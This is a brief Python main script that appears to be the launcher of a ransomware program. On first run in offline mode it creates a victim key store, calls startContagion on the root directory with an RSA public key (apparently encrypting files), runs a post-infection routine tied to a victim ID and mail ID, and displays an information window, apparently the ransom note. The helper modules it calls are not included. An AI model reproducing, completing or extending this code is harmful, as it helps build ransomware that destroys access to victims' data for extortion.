import starter
import utils
import guiMode
from postInfection import PostInfection


if starter.checkFirstTime("offline"):
    starter.keyStoreCreate(utils.what_is_my_id)
    starter.startContagion(utils.root_directory, utils.rsa_public_key)
    PostInfection( utils.what_is_my_id , utils.what_is_my_mail_id, "offline", utils.when_did_i_work, utils.rsa_public_key).firstWork()
    guiMode.displayInfoGUI(utils.aesIV_file_store_path)
else:
    guiMode.displayInfoGUI(starter.whichFile())